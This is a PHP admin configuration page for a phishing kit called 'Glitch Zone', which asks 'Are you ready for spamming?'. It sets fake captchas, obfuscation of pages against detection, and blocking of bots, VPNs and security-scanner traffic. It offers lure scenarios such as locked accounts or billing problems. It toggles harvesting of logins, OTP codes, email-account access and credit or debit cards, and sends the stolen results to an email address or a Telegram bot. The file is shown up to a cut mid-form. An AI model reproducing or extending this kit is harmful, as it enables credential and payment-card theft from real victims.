<?php
session_start();
error_reporting(0);
if (!isset($_SESSION['logged_in'])) {
    header('location: /glitch');
    die();
}
$settingsFile = "../config.json";

if (!file_exists($settingsFile)) {
    die('Configuration file not found.');
}

$settings = json_decode(file_get_contents($settingsFile), true);

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['save'])) {
    $settings['keypanel']                   = $_POST['keypanel'];
    $settings['config']['parameter']        = $_POST['parameter'];
    $settings['config']['captcha']          = $_POST['captcha'];
    $settings['config']['undetect_type']    = $_POST['undetect_type'];
    $typeblocker                            = $_POST['typeblocker'];
    $apikey                                 = trim($_POST['apikey_blocker'] ?? '');
    $settings['config']['stopbot']          = 'off';
    $settings['config']['botblocker']       = 'off';
    $settings['config']['keystopbot']       = '';
    $settings['config']['keybotblocker']    = '';
    if ($typeblocker === 'stopbot') {
        $settings['config']['stopbot']      = 'on';
        $settings['config']['keystopbot']   = $apikey;
    } elseif ($typeblocker === 'botblocker') {
        $settings['config']['botblocker']   = 'on';
        $settings['config']['keybotblocker']    = $apikey;
    }
    
    $settings['config']['strongblocker']    = isset($_POST['strongblocker']) ? 'on' : 'off';
    $settings['config']['useragent']        = isset($_POST['useragent']) ? 'on' : 'off';
    $settings['config']['host']             = isset($_POST['host']) ? 'on' : 'off';
    $settings['config']['ip']               = isset($_POST['ip']) ? 'on' : 'off';
    $settings['config']['proxyport']        = isset($_POST['proxyport']) ? 'on' : 'off';
    $settings['config']['isp']              = isset($_POST['isp']) ? 'on' : 'off';
    $settings['config']['dns']              = isset($_POST['dns']) ? 'on' : 'off';
    $settings['config']['vpn']              = isset($_POST['vpn']) ? 'on' : 'off';
    $settings['config']['onetime']          = isset($_POST['onetime']) ? 'on' : 'off';

    $settings['config']['lockcountry']      = isset($_POST['lockcountry']) ? 'on' : 'off';
    $settings['config']['listcountry']      = $_POST['listcountry'];

    $settings['config']['doublelogin']      = isset($_POST['doublelogin']) ? 'on' : 'off';
    $settings['config']['getotp']           = isset($_POST['getotp']) ? 'on' : 'off';
    $settings['config']['doubleotp']        = isset($_POST['doubleotp']) ? 'on' : 'off';
    $settings['config']['getemailaccess']   = isset($_POST['getemailaccess']) ? 'on' : 'off';
    $settings['config']['doubleemailaccess']    = isset($_POST['doubleemailaccess']) ? 'on' : 'off';
    $settings['config']['doublecreditcard'] = isset($_POST['doublecreditcard']) ? 'on' : 'off';

    $settings['config']['case']             = $_POST['case'];

    $settings['config']['resulttoemail']    = isset($_POST['resulttoemail']) ? 'on' : 'off';
    $settings['config']['emailResult']      = $_POST['emailResult'];
    $settings['config']['resulttotelegram'] = isset($_POST['resulttotelegram']) ? 'on' : 'off';
    $settings['config']['token']            = $_POST['token'];
    $settings['config']['chat_id']          = $_POST['chat_id'];
    
    $settings['config']['sending']          = $_POST['sending'];
    $settings['config']['smtp_user']        = $_POST['smtp_user'];
    $settings['config']['smtp_pass']        = $_POST['smtp_pass'];
    $settings['config']['smtp_host']        = $_POST['smtp_host'];
    $settings['config']['smtp_port']        = $_POST['smtp_port'];
    $settings['config']['smtp_secure']      = strtolower($_POST['smtp_secure'] ?? '');

    $configData = '';
    foreach ($settings as $key => $value) {
        $configData .= "{$key} = \"{$value}\"\n";
    }

    file_put_contents($settingsFile, json_encode($settings, JSON_PRETTY_PRINT));

    $_SESSION['message'] = 'Settings updated successfully!';
    $_SESSION['message_type'] = 'success';
    header("Location: /glitch/configurate");
    exit();
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Title Meta -->
    <meta charset="utf-8" />
    <title>Configuration | Glitch Zone</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <base href="/panel/">
    <meta name="theme-color" content="#ffffff">
    <!-- App favicon -->
    <link rel="shortcut icon" href="assets/img/favicon.ico">
    <!-- Google Font Family link -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Play:wght@400;700&display=swap" rel="stylesheet">
    <!-- Vendor css -->
    <link href="assets/css/vendor.min.css" rel="stylesheet" type="text/css" />
    <!-- Icons css -->
    <link href="assets/css/icons.min.css" rel="stylesheet" type="text/css" />
    <!-- App css -->
    <link href="assets/css/style.min.css" rel="stylesheet" type="text/css" />
    <!-- Theme Config js -->
    <script src="assets/js/config.js"></script>
    <style>
    /* Glitch Text Style */
    .glitch {
        font-size: 1rem;
        font-weight: bold;
        letter-spacing: 2px;
        text-transform: uppercase;
        position: relative;
        display: inline-block;
        animation: glitch-skew 1s infinite linear alternate-reverse,
                   glitch-flicker 3s infinite;
    }
    
    /* Dark Mode */
    .logo-dark .glitch {
        color: black;
    }
    
    .logo-dark .glitch::before,
    .logo-dark .glitch::after {
        color: black;
    }
    
    /* Light Mode */
    .logo-light .glitch {
        color: white;
    }
    
    .logo-light .glitch::before,
    .logo-light .glitch::after {
        color: white;
    }
    
    /* Glitch Effects */
    .glitch::before,
    .glitch::after {
        content: attr(data-text);
        position: absolute;
        top: 0;
        width: 100%;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
    }
    
    .glitch::before {
        left: 2px;
        text-shadow: -2px 0 red;
        animation: glitch-anim 2s infinite linear alternate-reverse;
    }
    
    .glitch::after {
        left: -2px;
        text-shadow: -2px 0 blue;
        animation: glitch-anim2 1.5s infinite linear alternate-reverse;
    }
    
    /* Animations */
    @keyframes glitch-anim {
        0% { clip: rect(0, 9999px, 0, 0); }
        5% { clip: rect(0, 9999px, 10px, 0); }
        10% { clip: rect(0, 9999px, 5px, 0); }
        15% { clip: rect(5px, 9999px, 15px, 0); }
        20% { clip: rect(15px, 9999px, 25px, 0); }
        25% { clip: rect(10px, 9999px, 20px, 0); }
        30% { clip: rect(20px, 9999px, 30px, 0); }
        100% { clip: rect(0, 9999px, 0, 0); }
    }
    
    @keyframes glitch-anim2 {
        0% { clip: rect(0, 9999px, 0, 0); }
        10% { clip: rect(10px, 9999px, 20px, 0); }
        20% { clip: rect(15px, 9999px, 25px, 0); }
        30% { clip: rect(5px, 9999px, 15px, 0); }
        40% { clip: rect(0px, 9999px, 10px, 0); }
        100% { clip: rect(0, 9999px, 0, 0); }
    }
    
    @keyframes glitch-skew {
        0% { transform: skew(0deg); }
        50% { transform: skew(5deg); }
        100% { transform: skew(-5deg); }
    }
    
    @keyframes glitch-flicker {
        0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
            opacity: 1;
        }
        20%, 22%, 24%, 55% {
            opacity: 0.8;
        }
    }
    </style>
</head>
<body>
    <!-- START Wrapper -->
    <div class="app-wrapper">
        <!-- Topbar Start -->
        <header class="app-topbar">
            <div class="container-fluid">
                <div class="navbar-header">
                    <div class="d-flex align-items-center gap-2">
                        <!-- Menu Toggle Button -->
                        <div class="topbar-item">
                            <button type="button" class="button-toggle-menu topbar-button">
                                <iconify-icon icon="line-md:menu"class="fs-24 align-middle"></iconify-icon>
                            </button>
                        </div>
                    </div>
                    <div class="d-flex align-items-center gap-2">
                        <!-- Theme Color (Light/Dark) -->
                        <div class="topbar-item">
                            <button type="button" class="topbar-button" id="light-dark-mode">
                                <iconify-icon icon="line-md:moon-alt-loop" class="fs-22 align-middle light-mode"></iconify-icon>
                                <iconify-icon icon="line-md:moon-alt-to-sunny-outline-loop-transition" class="fs-22 align-middle dark-mode"></iconify-icon>
                            </button>
                        </div>
                        <!-- User -->
                        <div class="dropdown topbar-item">
                            <a type="button" class="topbar-button" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                <span class="d-flex align-items-center">
                                    <img class="rounded-circle" width="32" src="assets/img/glitch-avatar.png" alt="avatar-3">
                                </span>
                            </a>
                            <div class="dropdown-menu dropdown-menu-end">
                                <!-- item-->
                                <a class="dropdown-item text-danger" href="/glitch/out">
                                    <iconify-icon icon="line-md:logout" class="align-middle me-2 fs-18"></iconify-icon>
                                    <span class="align-middle">Logout</span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <!-- Topbar End -->
        <!-- App Menu Start -->
        <div class="app-sidebar">
            <!-- Sidebar Logo -->
            <div class="logo-box">
                <a href="/glitch/home" class="logo-dark">
                    <p class="glitch" data-text="GLITCH ZONE">GLITCH ZONE</p>
                </a>
                <a href="/glitch/home" class="logo-light">
                    <p class="glitch" data-text="GLITCH ZONE">GLITCH ZONE</p>
                </a>
            </div>
            <div class="scrollbar" data-simplebar>
                <ul class="navbar-nav" id="navbar-nav">
                    <li class="menu-title">Menu</li>
                    <li class="nav-item">
                        <a class="nav-link" href="/glitch/home">
                            <span class="nav-icon">
                                <iconify-icon icon="line-md:home-md"></iconify-icon>
                            </span>
                            <span class="nav-text"> Dashboard </span>
                        </a>
                    </li>
                    <li class="nav-item active">
                        <a class="nav-link active" href="glitch/configurate">
                             <span class="nav-icon">
                                  <iconify-icon icon="line-md:cog-loop"></iconify-icon>
                             </span>
                             <span class="nav-text"> Configuration </span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://<?= $_SERVER['HTTP_HOST']; ?>/?<?= $settings['config']['parameter']; ?>" target="_blank">
                            <span class="nav-icon">
                                <iconify-icon icon="line-md:watch"></iconify-icon>
                            </span>
                            <span class="nav-text"> View Site </span>
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="animated-stars">
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
            <div class="shooting-star"></div>
        </div>
        <!-- App Menu End -->
        <!-- ==================================================== -->
        <!-- Start right Content here -->
        <!-- ==================================================== -->
        <div class="page-content">
            <!-- Start Container Fluid -->
            <div class="container-fluid">
                <!-- ========== Page Title Start ========== -->
                <div class="row">
                    <div class="col-12">
                        <div class="page-title-box">
                            <h4 class="mb-0">Are you ready for spamming?</h4>
                            <h4 class="mb-0">Time: 
                                <button type="button" class="btn btn-outline-primary me-1 mb-1" id="dateTime">
                                </button>
                            </h4>
                            <ol class="breadcrumb mb-0">
                                <li class="breadcrumb-item"><a href="javascript: void(0);">Glitch</a></li>
                                <li class="breadcrumb-item active">Configuration</li>
                            </ol>
                        </div>
                    </div>
                </div>
                <!-- ========== Page Title End ========== -->
                <div class="row row-cols-lg-2 gx-3">
                    <div class="col-lg-12">
                        <div class="card">
                            <div class="card-header">
                                <h5 class="card-title">
                                    Configuration
                                </h5>
                                <p class="card-subtitle">Adjust your site settings to match your preferences. Easily configure your site's appearance and key parameters.</p>
                            </div>
                            <div class="card-body">
                                <ul class="nav nav-tabs nav-justified" role="tablist">
                                    <li class="nav-item" role="presentation">
                                        <a href="#siteConfig" data-bs-toggle="tab" aria-expanded="false" class="nav-link active" aria-selected="true" role="tab">
                                            <span class="d-block d-sm-none">
                                                <iconify-icon icon="line-md:cog-loop"></iconify-icon>
                                            </span>
                                            <span class="d-none d-sm-block">Glitch | Configuration Site</span>
                                        </a>
                                    </li>
                                    <li class="nav-item" role="presentation">
                                        <a href="#configResult" data-bs-toggle="tab" aria-expanded="true" class="nav-link" aria-selected="false" role="tab" tabindex="-1">
                                            <span class="d-block d-sm-none">
                                                <iconify-icon icon="line-md:email-alert"></iconify-icon>
                                            </span>
                                            <span class="d-none d-sm-block">Glitch | Configuration Result</span>
                                        </a>
                                    </li>
                                    <li class="nav-item" role="presentation">
                                        <a href="#configSMTP" data-bs-toggle="tab" aria-expanded="true" class="nav-link" aria-selected="false" role="tab" tabindex="-1">
                                            <span class="d-block d-sm-none">
                                                <iconify-icon icon="line-md:email-arrow-up"></iconify-icon>
                                            </span>
                                            <span class="d-none d-sm-block">Glitch | Configuration Send with SMTP</span>
                                        </a>
                                    </li>
                                </ul>
                                <div class="tab-content pt-2 text-muted">
                                    <div class="tab-pane active show" id="siteConfig" role="tabpanel">
                                    <form method="POST" action="">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="card-header">
                                                    <h5 class="card-title mb-0">Glitch Site Configuration</h5>
                                                </div>
                                                <div class="card-body">
                                                    <div class="mb-3">
                                                        <label for="simpleinput" class="form-label">Glitch Access</label>
                                                        <input type="text" name="keypanel" placeholder="ex: P4$$w0rd" value="<?php echo $settings['keypanel']; ?>" class="form-control">
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="simpleinput" class="form-label">Glitch Parameter</label>
                                                        <input type="text" name="parameter" placeholder="ex: glitchzone" value="<?php echo $settings['config']['parameter']; ?>" class="form-control">
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="example-select" class="form-label">Glitch Type Captcha [ FAKE ]</label>
                                                        <select class="form-select" name="captcha">
                                                            <option <?php if (isset($settings['config']['captcha']) && $settings['config']['captcha'] == 'off') {
                                                                echo "selected=selected";
                                                            } ?> value="off">Off</option>
                                                            <option <?php if (isset($settings['config']['captcha']) && $settings['config']['captcha'] == 'google') {
                                                                echo "selected=selected";
                                                            } ?> value="google">Google Captcha</option>
                                                            <option <?php if (isset($settings['config']['captcha']) && $settings['config']['captcha'] == 'cloudflare') {
                                                                echo "selected=selected";
                                                            } ?> value="cloudflare">Cloudflare</option>
                                                        </select>
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="example-select" class="form-label">Glitch Type Undetect Site</label>
                                                        <select class="form-select" name="undetect_type">
                                                            <option <?php if (isset($settings['config']['undetect_type']) && $settings['config']['undetect_type'] == 'off') {
                                                                echo "selected=selected";
                                                            } ?> value="off">Default</option>
                                                            <option <?php if (isset($settings['config']['undetect_type']) && $settings['config']['undetect_type'] == 'md5') {
                                                                echo "selected=selected";
                                                            } ?> value="md5">MD5</option>
                                                            <option <?php if (isset($settings['config']['undetect_type']) && $settings['config']['undetect_type'] == 'base64') {
                                                                echo "selected=selected";
                                                            } ?> value="base64">BASE64</option>
                                                            <option <?php if (isset($settings['config']['undetect_type']) && $settings['config']['undetect_type'] == 'hex') {
                                                                echo "selected=selected";
                                                            } ?> value="hex">HEX</option>
                                                            <option <?php if (isset($settings['config']['undetect_type']) && $settings['config']['undetect_type'] == 'xor') {
                                                                echo "selected=selected";
                                                            } ?> value="xor">XOR</option>
                                                            <option <?php if (isset($settings['config']['undetect_type']) && $settings['config']['undetect_type'] == 'rot13') {
                                                                echo "selected=selected";
                                                            } ?> value="rot13">ROT13</option>
                                                            <option <?php if (isset($settings['config']['undetect_type']) && $settings['config']['undetect_type'] == 'rc4') {
                                                                echo "selected=selected";
                                                            } ?> value="rc4">RC4</option>
                                                            <option <?php if (isset($settings['config']['undetect_type']) && $settings['config']['undetect_type'] == 'reverse') {
                                                                echo "selected=selected";
                                                            } ?> value="reverse">REVERSE</option>
                                                        </select>
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="example-select" class="form-label">Glitch Type Blocker</label>
                                                        <select class="form-select" name="typeblocker">
                                                            <option value="none" <?= ($settings['config']['stopbot'] !== 'off' && $settings['config']['botblocker'] !== 'off') ? 'selected' : '' ?>>None</option>
                                                            <option value="stopbot" <?= ($settings['config']['stopbot'] === 'on') ? 'selected' : '' ?>>Stopbot</option>
                                                            <option value="botblocker" <?= ($settings['config']['botblocker'] === 'on') ? 'selected' : '' ?>>Botblocker</option>
                                                        </select>
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="simpleinput" class="form-label">Glitch Apikey Blocker</label>
                                                        <input type="text" name="apikey_blocker" class="form-control"
                                                            value="<?= ($settings['config']['stopbot'] === 'on') ? $settings['config']['keystopbot'] : (($settings['config']['botblocker'] === 'on') ? $settings['config']['keybotblocker'] : '') ?>">
                                                    </div>
                                                </div>
                                                <div class="card-header">
                                                    <h5 class="card-title mb-0">Glitch Blocker Configuration</h5>
                                                </div>
                                                <div class="card-body">
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" checked disabled>
                                                            <label class="form-check-label">Glitch | UNDETECT SITE</label>
                                                        </div>
                                                    </div>
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="strongblocker" name="strongblocker" <?php if (isset($settings['config']['strongblocker']) && $settings['config']['strongblocker'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="strongblocker">Glitch | STRONG BLOCKER <span class="badge badge-outline-danger me-1">HOT</span></label>
                                                        </div>
                                                    </div>
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="useragent" name="useragent" <?php if (isset($settings['config']['useragent']) && $settings['config']['useragent'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="useragent">Glitch | Block Useragent</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="host" name="host" <?php if (isset($settings['config']['host']) && $settings['config']['host'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="host">Glitch | Block Hostname</label>
                                                        </div>
                                                    </div>
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="ip" name="ip" <?php if (isset($settings['config']['ip']) && $settings['config']['ip'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="ip">Glitch | IP Range</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="isp" name="isp" <?php if (isset($settings['config']['isp']) && $settings['config']['isp'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="isp">Glitch | ISP</label>
                                                        </div>
                                                    </div>
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="proxyport" name="proxyport" <?php if (isset($settings['config']['proxyport']) && $settings['config']['proxyport'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="proxyport">Glitch | PROXY PORT</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="dns" name="dns" <?php if (isset($settings['config']['dns']) && $settings['config']['dns'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="dns">Glitch | DNS</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="vpn" name="vpn" <?php if (isset($settings['config']['vpn']) && $settings['config']['vpn'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="vpn">Glitch | VPN</label>
                                                        </div>
                                                    </div>
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="onetime" name="onetime" <?php if (isset($settings['config']['onetime']) && $settings['config']['onetime'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="onetime">Glitch | One Time Access</label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-lg-6">
                                                <div class="card-header">
                                                    <h5 class="card-title mb-0">Glitch Lock Country Configuration</h5>
                                                </div>
                                                <div class="card-body">
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="lockcountry" name="lockcountry" <?php if (isset($settings['config']['lockcountry']) && $settings['config']['lockcountry'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="lockcountry">Glitch Lock Country Allowed</label>
                                                        </div>
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="listcountry" class="form-label">Country Allowed</label>
                                                        <input type="text" id="listcountry" name="listcountry" class="form-control" placeholder="ex: US,CA,GB" value="<?= isset($settings['config']['listcountry']) ? htmlspecialchars($settings['config']['listcountry']) : '' ?>">
                                                    </div>
                                                </div>
                                                <div class="card-header">
                                                    <h5 class="card-title mb-0">Glitch Case Configuration</h5>
                                                </div>
                                                <div class="card-body">
                                                    <div class="mb-3">
                                                        <label for="example-select" class="form-label">Glitch Type Case</label>
                                                        <select class="form-select" name="case">
                                                            <option <?php if (isset($settings['config']['case']) && $settings['config']['case'] == 'off') {
                                                                echo "selected=selected";
                                                            } ?> value="off">Off</option>
                                                            <option <?php if (isset($settings['config']['case']) && $settings['config']['case'] == 'unusual') {
                                                                echo "selected=selected";
                                                            } ?> value="unusual">Account Unusual</option>
                                                            <option <?php if (isset($settings['config']['case']) && $settings['config']['case'] == 'billing-problem') {
                                                                echo "selected=selected";
                                                            } ?> value="billing-problem">Account Billing Problem</option>
                                                            <option <?php if (isset($settings['config']['case']) && $settings['config']['case'] == 'locked') {
                                                                echo "selected=selected";
                                                            } ?> value="locked">Account Locked</option>
                                                            <option <?php if (isset($settings['config']['case']) && $settings['config']['case'] == 'prime') {
                                                                echo "selected=selected";
                                                            } ?> value="prime">Prime Pause</option>
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="card-header d-flex justify-content-between align-items-center">
                                                    <h5 class="card-title mb-0">Glitch Page Configuration</h5>
                                                    <button class="btn btn-outline-primary" type="button" data-bs-toggle="collapse" data-bs-target="#GlitchEmail" aria-expanded="false" aria-controls="GlitchEmail">
                                                        List Email Provider
                                                    </button>
                                                </div>
                                                <div class="collapse" id="GlitchEmail">
                                                    <div class="card mb-0">
                                                        <div class="card-body">
                                                            <ul>
                                                                <li>AOL (@aol)</li>
                                                                <li>ATT Family (@att|@ameritech|@sbcglobal|@bellsouth|@flash|@nvbell|@pacbell|@prodigy|@snet|@swbell)</li>
                                                                <li>Microsoft Family (@hotmail|@outlook|@live|@msn)</li>
                                                                <li>Yahoo Family (@yahoo|@ymail|@rocketmail)</li>
                                                                <li>Spectrum Family (@charter|@spectrum|@twc|@rr)</li>
                                                            </ul>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="card-body">
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="doublelogin" name="doublelogin" <?php if (isset($settings['config']['doublelogin']) && $settings['config']['doublelogin'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="doublelogin">Glitch | Double Login</label>
                                                        </div>
                                                    </div>
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="getotp" name="getotp" <?php if (isset($settings['config']['getotp']) && $settings['config']['getotp'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="getotp">Glitch | Get OTP</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="doubleotp" name="doubleotp" <?php if (isset($settings['config']['doubleotp']) && $settings['config']['doubleotp'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="doubleotp">Glitch | Double OTP</label>
                                                        </div>
                                                    </div>
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="getemailaccess" name="getemailaccess" <?php if (isset($settings['config']['getemailaccess']) && $settings['config']['getemailaccess'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="getemailaccess">Glitch | Get Email Access</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="doubleemailaccess" name="doubleemailaccess" <?php if (isset($settings['config']['doubleemailaccess']) && $settings['config']['doubleemailaccess'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="doubleemailaccess">Glitch | Double Email Access</label>
                                                        </div>
                                                    </div>
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="doublecreditcard" name="doublecreditcard" <?php if (isset($settings['config']['doublecreditcard']) && $settings['config']['doublecreditcard'] == 'on') { echo "checked"; } ?>>
                                                            <label class="form-check-label" for="doublecreditcard">Glitch | Double Credit or Debit Card</label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-12">
                                                <div class="text-end">
                                                    <button type="submit" class="btn btn-outline-primary" name="save">Save Configuration</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="tab-pane" id="configResult" role="tabpanel">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="card-header">
                                                    <h5 class="card-title mb-0">Glitch Configuration Result</h5>
                                                </div>
                                                <div class="card-body">
                                                    <div class="mb-3">
                                                        <label for="emailResult" class="form-label">Glitch Email Result</label>
                                                        <input type="text" id="emailResult" name="emailResult" placeholder="ex: emailresult@glitchlabs.tools" value="<?= htmlspecialchars($settings['config']['emailResult'] ?? '') ?>" class="form-control result-email-field" <?= (empty($settings['config']['resulttoemail']) || $settings['config']['resulttoemail'] !== 'on') ? 'disabled' : '' ?>>
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="telegramToken" class="form-label">Glitch Email Telegram API Token</label>
                                                        <input type="text" id="telegramToken" name="token" placeholder="ex: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11" value="<?= htmlspecialchars($settings['config']['token'] ?? '') ?>" class="form-control result-telegram-field" <?= (empty($settings['config']['resulttotelegram']) || $settings['config']['resulttotelegram'] !== 'on') ? 'disabled' : '' ?>>
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="chatId" class="form-label">Glitch Telegram User ID</label>
                                                        <input type="text" id="chatId" name="chat_id" placeholder="ex: 1234567890" value="<?= htmlspecialchars($settings['config']['chat_id'] ?? '') ?>" class="form-control result-telegram-field" <?= (empty($settings['config']['resulttotelegram']) || $settings['config']['resulttotelegram'] !== 'on') ? 'disabled' : '' ?>>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-lg-6">
                                                <div class="card-header">
                                                    <h5 class="card-title mb-0">Glitch Result Configuration</h5>
                                                </div>
                                                <div class="card-body">
                                                    <div class="mb-3">
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="resulttoemail" name="resulttoemail" <?= (!empty($settings['config']['resulttoemail']) && $settings['config']['resulttoemail'] === 'on') ? 'checked' : '' ?>>
                                                            <label class="form-check-label" for="resulttoemail">To Email</label>
                                                        </div>
                                                        <div class="form-check form-check-inline">
                                                            <input type="checkbox" class="form-check-input" id="resulttotelegram" name="resulttotelegram" <?= (!empty($settings['config']['resulttotelegram']) && $settings['config']['resulttotelegram'] === 'on') ? 'checked' : '' ?>>
                                                            <label class="form-check-label" for="resulttotelegram">To Telegram</label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-12">
                                                <div class="text-end">
                                                    <button type="submit" class="btn btn-outline-primary" name="save">Save Configuration</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="tab-pane" id="configSMTP" role="tabpanel">
                                        <div class="row">
                                            <div class="col-lg-6">
                                                <div class="card-header">
                                                    <h5 class="card-title mb-0">Glitch Configuration Send with SMTP</h5>
                                                </div>
                                                <div class="card-body">
                                                    <div class="mb-3">
                                                        <label for="smtp-user" class="form-label">Glitch SMTP User</label>
                                                        <input type="text" id="smtp-user" name="smtp_user" placeholder="ex: smtpresult@glitchlabs.tools" value="<?= $settings['config']['smtp_user'] ?? '' ?>" class="form-control smtp-field">
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="smtp-pass" class="form-label">Glitch SMTP Password</label>
                                                        <input type="password" id="smtp-pass" name="smtp_pass" placeholder="ex: P4$$w0rD" value="<?= $settings['config']['smtp_pass'] ?? '' ?>" class="form-control smtp-field">
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="smtp-port" class="form-label">Glitch SMTP Port</label>
                                                        <select class="form-select smtp-field" id="smtp-port" name="smtp_port">
                                                            <?php 
                                                            $ports = ['', '25', '587', '465', '2525'];
                                                            foreach ($ports as $port) {
                                                                $selected = ($settings['config']['smtp_port'] ?? '') === $port ? 'selected' : '';
                                                                $label = $port === '' ? 'None' : $port;
                                                                echo "<option value=\"$port\" $selected>$label</option>";
                                                            }
                                                            ?>
                                                        </select>
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="smtp-server" class="form-label">Glitch SMTP Server</label>
                                                        <input type="text" id="smtp-server" name="smtp_host" placeholder="ex: smtp.glitchlabs.tools" value="<?= $settings['config']['smtp_host'] ?? '' ?>" class="form-control smtp-field">
                                                    </div>
                                                    <div class="mb-3">
                                                        <label for="smtp-secure" class="form-label">Glitch SMTP Secure</label>
                                                        <select class="form-select smtp-field" id="smtp-secure" name="smtp_secure">
                                                            <?php 
                                                            $smtp_secure = ['', 'SSL', 'TLS'];
                                                            foreach ($smtp_secure as $secure) {
                                                                $selected = ($settings['config']['smtp_secure'] ?? '') === $secure ? 'selected' : '';
                                                                $label = $secure === '' ? 'None' : $secure;
                                                                echo "<option value=\"$secure\" $selected>$label</option>";
                                                            }
                                                            ?>
                                                        </select>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-lg-6">
                                                <div class="card-header">
                                                    <h5 class="card-title mb-0">Glitch Send Method</h5>
                                                </div>
                                                <div class="card-body">
                                                    <div class="mb-3">
                                                        <div class="form-check">
                                                            <input class="form-check-input" type="radio" id="send-smtp" name="sending" value="smtp" <?= ($settings['config']['sending'] ?? '') === 'smtp' ? 'checked' : '' ?>>
                                                            <label class="form-check-label" for="send-smtp">Use External with SMTP</label>
                                                        </div>
                                                        <div class="form-check">
                                                            <input class="form-check-input" type="radio" id="send-mail" name="sending" value="mail" <?= ($settings['config']['sending'] ?? '') === 'mail' ? 'checked' : '' ?>>
